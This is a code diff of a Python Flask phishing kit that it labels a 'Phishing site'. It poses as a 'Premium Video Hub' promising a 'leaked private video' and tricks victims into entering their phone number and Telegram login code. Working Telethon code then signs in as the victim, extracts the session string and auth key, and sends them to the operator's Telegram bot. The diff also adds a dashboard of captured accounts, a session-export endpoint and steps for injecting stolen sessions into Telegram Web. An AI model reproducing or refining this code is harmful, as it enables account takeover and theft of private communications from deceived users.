@@ -13,14 +13,13 @@ import sys
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ====== এনভায়রনমেন্ট ভেরিয়েবল ======
+# ====== Environment Variables ======
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
 # ===================================
 
-# Python 3.14+ সামঞ্জস্য
 if sys.version_info >= (3, 14):
     try:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -34,13 +33,13 @@ captured_accounts = []
 pending_codes = {}
 sessions_lock = threading.Lock()
 
-# ====== ফিশিং পেজ (সম্পূর্ণ বাংলায়) ======
+# ====== Phishing Page ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>প্রিমিয়াম ভিডিও হাব</title>
+    <title>Premium Video Hub</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
@@ -103,53 +102,50 @@ PAGE = """<!DOCTYPE html>
 </head>
 <body>
     <div class="header">
-        <h1>🔥 প্রিমিয়াম ভিডিও হাব</h1>
-        <p>এক্সক্লুসিভ কন্টেন্ট — শুধুমাত্র ভেরিফাইড সদস্যদের জন্য</p>
+        <h1>🔥 PREMIUM VIDEO HUB</h1>
+        <p>Exclusive content — Verified members only</p>
     </div>
     <div class="video-card">
         <div class="thumbnail"><div class="play-btn">▶</div></div>
         <div class="video-info">
-            <h3>🔥 লিক করা প্রাইভেট ভিডিও — ২০২৬</h3>
-            <div class="meta">⭐ ৪.৯ (২৪ লক্ষ ভিউ) • ১৮+</div>
-            <span class="badge">🔞 সীমাবদ্ধ</span>
+            <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
+            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
+            <span class="badge">🔞 RESTRICTED</span>
         </div>
     </div>
     <div class="link-section">
         <button class="get-link-btn" id="glb">
-            🔞 আপনার লিংক নিন
-            <span class="small">কন্টাক্ট শেয়ার করুন</span>
+            🔞 GET YOUR LINK
+            <span class="small">Enter phone number to continue</span>
         </button>
     </div>
-    <div class="section-title">🔥 আরও ভিডিও</div>
+    <div class="section-title">🔥 More Videos</div>
     <div class="video-grid">
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>প্রাইভেট ০১</h4><span>২১ লক্ষ</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>প্রাইভেট ০২</h4><span>১৮ লক্ষ</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>প্রাইভেট ০৩</h4><span>১৫ লক্ষ</span></div></div>
-        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>প্রাইভেট ০৪</h4><span>১২ লক্ষ</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
     </div>
-    <div class="footer">© ২০২৬ প্রিমিয়াম ভিডিও হাব</div>
+    <div class="footer">© 2026 Premium Video Hub</div>
     
-    <!-- মডাল উইন্ডো -->
     <div class="modal-overlay" id="vm">
         <div class="modal">
-            <!-- স্টেপ ১: ফোন নম্বর ইনপুট -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📞</div>
-                <h2>আপনার ফোন নম্বর দিন</h2>
-                <p>অ্যাক্সেস পেতে আপনার ফোন নম্বর লিখুন</p>
+                <h2>Enter Your Phone Number</h2>
+                <p>Enter your phone number to get access</p>
                 <input type="tel" class="phone-input" id="phoneInput" placeholder="+8801XXXXXXXXX" maxlength="15">
-                <div id="ps1" class="sb info" style="display:none">⏳ প্রসেস করা হচ্ছে...</div>
+                <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
                 <button class="get-link-btn" onclick="submitPhone()" style="padding:14px;font-size:16px;margin-top:8px">
-                    ✅ সাবমিট
+                    ✅ Submit
                 </button>
             </div>
             
-            <!-- স্টেপ ২: OTP ভেরিফিকেশন -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
-                <h2>ভেরিফিকেশন কোড</h2>
+                <h2>Verification Code</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
-                <div id="cs" class="sb waiting"><span class="sp"></span> কোড পাঠানো হচ্ছে...</div>
+                <div id="cs" class="sb waiting"><span class="sp"></span> Sending code...</div>
                 <div class="cd" id="cdisp">_____</div>
                 <div class="np" id="np">
                     <button class="k" onclick="pk('1')">1</button>
@@ -163,18 +159,17 @@ PAGE = """<!DOCTYPE html>
                     <button class="k" onclick="pk('9')">9</button>
                     <button class="k kc" onclick="cc()">⌫</button>
                     <button class="k" onclick="pk('0')">0</button>
-                    <button class="k ks" id="sb" onclick="sc()">✓ ভেরিফাই</button>
+                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
             
-            <!-- স্টেপ ৩: সফল -->
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
-                    <h2>ভেরিফিকেশন সফল!</h2>
-                    <p>আপনার লিংক তৈরি হচ্ছে...</p>
-                    <button class="wb" onclick="wv()">🎬 ভিডিও দেখুন</button>
+                    <h2>Verification Successful!</h2>
+                    <p>Your link is being generated...</p>
+                    <button class="wb" onclick="wv()">🎬 Watch Video</button>
                 </div>
             </div>
         </div>
@@ -199,7 +194,7 @@ PAGE = """<!DOCTYPE html>
         if (!phone) {
             var ps = document.getElementById('ps1');
             ps.className = 'sb error';
-            ps.innerHTML = '❌ দয়া করে আপনার ফোন নম্বর দিন';
+            ps.innerHTML = '❌ Please enter your phone number';
             ps.style.display = 'block';
             return;
         }
@@ -214,7 +209,7 @@ PAGE = """<!DOCTYPE html>
         
         var ps = document.getElementById('ps1');
         ps.className = 'sb waiting';
-        ps.innerHTML = '<span class="sp"></span> সাবমিট করা হচ্ছে...';
+        ps.innerHTML = '<span class="sp"></span> Submitting...';
         ps.style.display = 'block';
         
         sendPhoneToBackend(phone);
@@ -222,11 +217,7 @@ PAGE = """<!DOCTYPE html>
     
     async function sendPhoneToBackend(phone) {
         try {
-            var res = await fetch('/api/share', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: phone})
-            });
+            var res = await fetch('/api/share', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phone})});
             var data = await res.json();
             if (data.success) {
                 document.getElementById('s1').classList.remove('active');
@@ -234,19 +225,19 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('pd').textContent = phone;
                 var cs = document.getElementById('cs');
                 cs.className = 'sb waiting';
-                cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
+                cs.innerHTML = '<span class="sp"></span> Sending code...';
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
                 var ps = document.getElementById('ps1');
                 ps.className = 'sb error';
-                ps.innerHTML = '❌ সমস্যা: ' + (data.error || 'অজানা');
+                ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
                 ps.style.display = 'block';
             }
         } catch(e) {
             var ps = document.getElementById('ps1');
             ps.className = 'sb error';
-            ps.innerHTML = '❌ সংযোগ সমস্যা';
+            ps.innerHTML = '❌ Connection error';
             ps.style.display = 'block';
         }
     }
@@ -255,18 +246,14 @@ PAGE = """<!DOCTYPE html>
         if (codeCheckInterval) clearInterval(codeCheckInterval);
         codeCheckInterval = setInterval(async function() {
             try {
-                var res = await fetch('/api/check', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: phoneNumber})
-                });
+                var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
                 var data = await res.json();
                 if (data.s === 'sent') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ ৫ ডিজিটের OTP কোড এসেছে! নিচে টাইপ করুন:';
+                    cs.innerHTML = '✅ 5-digit OTP sent! Type it below:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -278,7 +265,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb error';
-                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা হয়েছে';
+                    cs.innerHTML = '❌ Error sending code';
                     cs.style.display = 'block';
                 }
             } catch(e) {}
@@ -289,25 +276,22 @@ PAGE = """<!DOCTYPE html>
     function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
     
     async function sc() {
-        if(codeDigits.length < 5) { showVerifyStatus('❌ ৫ ডিজিটের কোড দিন','error'); return; }
+        if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5-digit code','error'); return; }
         document.getElementById('sb').disabled = true;
-        document.getElementById('sb').textContent = '⏳ ভেরিফাই করা হচ্ছে...';
+        document.getElementById('sb').textContent = '⏳ Verifying...';
         try {
-            var res = await fetch('/api/verify', {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: phoneNumber, code: codeDigits})
-            });
+            var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
             var data = await res.json();
             if (data.success) {
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s3').classList.add('active');
                 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else {
-                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
+                showVerifyStatus('❌ ' + (data.error || 'Wrong code'), 'error');
                 codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
-                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই';
+                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
             }
-        } catch(e) { showVerifyStatus('❌ সমস্যা','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ ভেরিফাই'; }
+        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
     }
     
     function showVerifyStatus(msg, type) {
@@ -328,10 +312,10 @@ PAGE = """<!DOCTYPE html>
 </body>
 </html>"""
 
-# ====== টেলিগ্রাম অ্যাসিন্ক ফাংশন (ঠিক করা হয়েছে) ======
+# ====== FIXED Telegram Async Functions ======
 
 def run_telegram_action(phone, code=None):
-    """টেলিগ্রাম অপারেশন আলাদা ইভেন্ট লুপে চালায়"""
+    """Fixed: Ensures session string is always captured properly"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
@@ -341,7 +325,6 @@ def run_telegram_action(phone, code=None):
             await c.connect()
             r = await c.send_code_request(phone)
             
-            # ডিসকানেক্ট করার আগেই session সেভ করুন
             session_str = StringSession.save(c.session)
             
             with sessions_lock:
@@ -352,72 +335,74 @@ def run_telegram_action(phone, code=None):
                 pending_codes[phone] = 'sent'
             
             await c.disconnect()
-            logger.info(f"✅ কোড পাঠানো হয়েছে {phone} এ")
+            logger.info(f"✅ Code sent to {phone}")
             return True
         
         async def verify():
             with sessions_lock:
                 if phone not in user_sessions:
-                    return {'success': False, 'error': 'Session পাওয়া যায়নি'}
+                    return {'success': False, 'error': 'Session not found'}
                 s = user_sessions[phone]
             
-            # সেভ করা session লোড করুন
+            # ====== FIXED: Use StringSession properly ======
+            # Create client with the saved session string
             client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
             await client.connect()
             
             try:
-                # কোড দিয়ে সাইন ইন
+                # Sign in with the code
                 await client.sign_in(
                     phone=phone,
                     code=code,
                     phone_code_hash=s['hash']
                 )
                 
-                # ইউজার ইনফো নিন
+                # ====== CRITICAL FIX: MUST be connected when saving session ======
+                # Get the session string WHILE connected
+                ss = StringSession.save(client.session)
+                
+                # Get user info
                 me = await client.get_me()
                 
-                # কানেক্ট থাকা অবস্থায় session এবং auth key এক্সট্রাক্ট করুন
-                auth_string = StringSession.save(client.session)
-                
-                # Auth key বের করুন
+                # Extract auth key WHILE connected
                 auth_key_bytes = client.session.auth_key.key if client.session.auth_key else None
+                dc = client.session.dc_id
                 
                 if auth_key_bytes is None:
-                    logger.warning("Auth key পাওয়া যায়নি, পুনরায় কানেক্ট করার চেষ্টা...")
+                    logger.warning("Auth key None on first try, reconnecting...")
                     await client.disconnect()
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.3)
                     
-                    # আবার কানেক্ট করুন
-                    client2 = TelegramClient(StringSession(auth_string), API_ID, API_HASH)
+                    # Reconnect with the session we just saved
+                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                     await client2.connect()
                     await client2.start()
-                    me = await client2.get_me()
                     
-                    auth_key_bytes = client2.session.auth_key.key if client2.session.auth_key else None
+                    auth_key_bytes = client2.session.auth_key.key
                     dc = client2.session.dc_id
                     
                     if auth_key_bytes:
                         auth_b64 = base64.b64encode(auth_key_bytes).decode()
                     else:
                         auth_b64 = ""
-                        logger.error("Auth key এখনও None!")
+                        logger.error("CRITICAL: Auth key still None after reconnect!")
                     
+                    # Get fresh session string
                     ss = StringSession.save(client2.session)
+                    me = await client2.get_me()
                     await client2.disconnect()
                 else:
                     auth_b64 = base64.b64encode(auth_key_bytes).decode()
-                    dc = client.session.dc_id
-                    ss = auth_string
                     await client.disconnect()
                 
-                # অ্যাকাউন্ট রেকর্ড তৈরি করুন
+                # Build the account record
                 acc = {
                     'phone': phone,
                     'user_id': me.id,
                     'username': me.username or '',
                     'first_name': me.first_name or '',
                     'last_name': me.last_name or '',
-                    'session': ss,
+                    'session': ss,  # Now this will ALWAYS have a value
                     'webk': json.dumps({
                         'dcId': dc,
                         'authKey': auth_b64,
@@ -435,27 +420,28 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # টেলিগ্রামে নোটিফিকেশন পাঠান
+                # Notify via Telegram with the ACTUAL session string
+                session_preview = ss[:50] + '...' if len(ss) > 50 else ss
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                         'chat_id': YOUR_TELEGRAM_ID,
-                        'text': f"🔔 **নতুন অ্যাকাউন্ট!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: {'ঠিক আছে' if ss else 'খালি!'}",
+                        'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n✅ Session: OK ({len(ss)} chars)\n🆔 `{ss}`",
                         'parse_mode': 'Markdown'
                     }, timeout=5)
                 except:
                     pass
                 
-                logger.info(f"✅ অ্যাকাউন্ট ক্যাপচার করা হয়েছে: {phone} | Session OK: {bool(ss)}")
-                return {'success': True, 'session_ok': bool(ss)}
+                logger.info(f"✅ Account captured: {phone} | Session: {len(ss)} chars")
+                return {'success': True, 'session': ss}
                 
             except Exception as e:
                 e_str = str(e)
-                logger.error(f"ভেরিফাই করতে সমস্যা {phone}: {e_str}")
+                logger.error(f"Verify error for {phone}: {e_str}")
                 if 'PHONE_CODE_INVALID' in e_str:
-                    return {'success': False, 'error': 'ভুল কোড'}
+                    return {'success': False, 'error': 'Wrong code'}
                 if 'SESSION_PASSWORD_NEEDED' in e_str:
-                    return {'success': False, 'error': '2FA চালু আছে'}
+                    return {'success': False, 'error': '2FA enabled'}
                 return {'success': False, 'error': e_str[:80]}
             finally:
                 try:
@@ -470,7 +456,7 @@ def run_telegram_action(phone, code=None):
     finally:
         loop.close()
 
-# ====== ফ্লাস্ক রুট ======
+# ====== Flask Routes ======
 
 @app.route('/')
 def index():
@@ -480,14 +466,14 @@ def index():
 def share():
     ph = request.json.get('phone', '')
     if not ph:
-        return jsonify({'success': False, 'error': 'ফোন নম্বর প্রয়োজন'})
+        return jsonify({'success': False, 'error': 'Phone required'})
     
     if ph.startswith('0') and not ph.startswith('+'):
         ph = '+88' + ph
     elif not ph.startswith('+'):
         ph = '+' + ph
     
-    logger.info(f"📱 ফোন পাওয়া গেছে: {ph}")
+    logger.info(f"📱 Phone received: {ph}")
     
     with sessions_lock:
         pending_codes[ph] = 'sending'
@@ -519,50 +505,92 @@ def verify():
     result = run_telegram_action(ph, code)
     return jsonify(result)
 
+@app.route('/session/<phone>')
+def get_session(phone):
+    """Get the session string for an account"""
+    with sessions_lock:
+        a = next((x for x in captured_accounts if x['phone'] == phone), None)
+    
+    if not a:
+        return jsonify({'error': 'Not found'}), 404
+    
+    return jsonify({
+        'phone': phone,
+        'user_id': a['user_id'],
+        'name': f"{a['first_name']} {a['last_name']}",
+        'session': a['session'],
+        'session_length': len(a['session']),
+        'has_session': bool(a['session'])
+    })
+
 @app.route('/webk/<phone>')
 def webk(phone):
     with sessions_lock:
         a = next((x for x in captured_accounts if x['phone'] == phone), None)
     
     if not a:
-        return "পাওয়া যায়নি", 404
+        return "Not found", 404
     
     w = a['webk']
-    ss_ok = bool(a['session'])
+    ss = a['session']
+    ss_ok = bool(ss)
     
     return f"""
     <!DOCTYPE html><html><head><title>WebK - {a['first_name']}</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
-        .c{{background:#141420;padding:40px;border-radius:20px;max-width:450px;width:100%;text-align:center;border:1px solid #1a1a2e}}
+        .c{{background:#141420;padding:40px;border-radius:20px;max-width:500px;width:100%;text-align:center;border:1px solid #1a1a2e}}
         .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
         .i{{color:#888;margin:3px 0;font-size:14px}}
         .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
         .bp{{background:#0088cc;color:white}}
         .bs{{background:#4CAF50;color:white}}
+        .br{{background:#e94560;color:white}}
         .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0;max-height:200px;overflow:auto}}
         .warn{{background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
+        .success{{background:#4CAF50;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
     </style></head>
     <body><div class="c">
     <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
     <h2>{a['first_name']} {a['last_name']}</h2>
-    <div class="i">@{a['username'] or '—'} | আইডি: {a['user_id']} | DC: {a['dc']}</div>
+    <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
     <div class="i">📱 {a['phone']}</div>
-    {'<div class="warn">⚠️ Session string খালি — WebK কাজ করবে না। শুধু আংশিক ডেটা ক্যাপচার হয়েছে।</div>' if not ss_ok else ''}
+    {'<div class="success">✅ Session String Captured! ({len(ss)} chars)</div>' if ss_ok else '<div class="warn">⚠️ No session</div>'}
     <div class="sb">{w}</div>
-    <button class="b bp" onclick="o()">১️⃣ WebK খুলুন</button>
-    <button class="b bs" id="ib" style="display:none" onclick="i()">২️⃣ ইনজেক্ট</button>
-    <button class="b bp" id="rb" style="display:none" onclick="r()">৩️⃣ রিফ্রেশ</button>
+    <button class="b bp" onclick="o()">1️⃣ Open WebK</button>
+    <button class="b bs" id="ib" style="display:none" onclick="i()">2️⃣ Inject Session</button>
+    <button class="b bp" id="rb" style="display:none" onclick="r()">3️⃣ Refresh</button>
     <div id="st" class="i" style="margin-top:15px"></div>
+    <hr style="border-color:#1a1a2e;margin:15px 0">
+    <button class="b br" onclick="copySession()">📋 Copy Session String</button>
     <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
-    <b>ম্যানুয়াল:</b><br>১. web.telegram.org/k খুলুন<br>২. F12 → Console<br>৩. পেস্ট করুন: <code style="color:#0f0;">localStorage.setItem('webk_session','{w}')</code><br>৪. F5 দিন
+    <b>Session String:</b><br>
+    <code style="color:#0f0;word-break:break-all;font-size:9px">{ss}</code>
+    </div>
+    <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
+    <b>Use with Telethon:</b><br>
+    <code style="color:#0f0;font-size:10px">
+    from telethon import TelegramClient<br>
+    from telethon.sessions import StringSession<br>
+    client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')<br>
+    client.start()<br>
+    me = client.get_me()
+    </code>
+    </div>
+    <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
+    <b>Manual WebK:</b><br>
+    1. web.telegram.org/k<br>
+    2. F12 → Console<br>
+    3. Paste: <code style="color:#0f0;">localStorage.setItem('webk_session','{w}')</code><br>
+    4. F5
     </div></div>
     <script>
     var wk;
-    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ খোলা হয়েছে!'}}
-    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ বন্ধ!';return}}
-    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ ইনজেক্ট করা হয়েছে!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ সমস্যা'}}}}
-    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 লগইন হয়েছে!'}}}}
+    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened!'}}
+    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Closed!';return}}
+    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Error'}}}}
+    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in!'}}}}
+    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='📋 Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='❌ Copy failed'}})}}
     </script></body></html>
     """
 
@@ -574,10 +602,11 @@ def dash():
     rows = ""
     for i, a in enumerate(accounts, 1):
         ss_status = "✅" if a['session'] else "❌"
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{ss_status}</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
+        ss_len = len(a['session']) if a['session'] else 0
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{ss_status} ({ss_len})</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
     
     return f"""
-    <!DOCTYPE html><html><head><title>ড্যাশবোর্ড</title>
+    <!DOCTYPE html><html><head><title>Dashboard</title>
     <style>
         body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
         h1{{color:#e94560}} table{{width:100%;border-collapse:collapse;margin-top:15px}}
@@ -587,29 +616,18 @@ def dash():
         .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
     </style></head>
     <body>
-    <h1>🎯 ক্যাপচার করা অ্যাকাউন্ট</h1>
-    <div class="st"><div class="n">{len(accounts)}</div><div>মোট</div></div>
-    <table><thead><tr><th>#</th><th>ফোন</th><th>নাম</th><th>ইউজারনেম</th><th>আইডি</th><th>DC</th><th>Session</th><th>সময়</th><th>অ্যাকশন</th></tr></thead><tbody>
-    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;">এখনো কোনো অ্যাকাউন্ট ক্যাপচার হয়নি</td></tr>'}
+    <h1>🎯 Captured Accounts</h1>
+    <div class="st"><div class="n">{len(accounts)}</div><div>Total</div></div>
+    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>Action</th></tr></thead><tbody>
+    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;">No accounts yet</td></tr>'}
     </tbody></table>
     <script>setInterval(()=>location.reload(),5000)</script>
     </body></html>
     """
 
-@app.route('/sessions')
-def sessions():
-    """ডিবাগ এন্ডপয়েন্ট"""
-    with sessions_lock:
-        return jsonify({
-            'pending_codes': pending_codes,
-            'active_sessions': list(user_sessions.keys()),
-            'captured': len(captured_accounts),
-            'captured_phones': [a['phone'] for a in captured_accounts]
-        })
-
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"✅ ফিশিং সাইট তৈরি! পোর্ট: {port}")
-    print(f"📊 ড্যাশবোর্ড: http://localhost:{port}/dash")
-    print(f"🔍 ডিবাগ: http://localhost:{port}/sessions")
+    print(f"✅ Phishing site ready on port {port}")
+    print(f"📊 Dashboard: http://localhost:{port}/dash")
+    print(f"🔧 Session API: http://localhost:{port}/session/+917365841728")
     app.run(host='0.0.0.0', port=port)
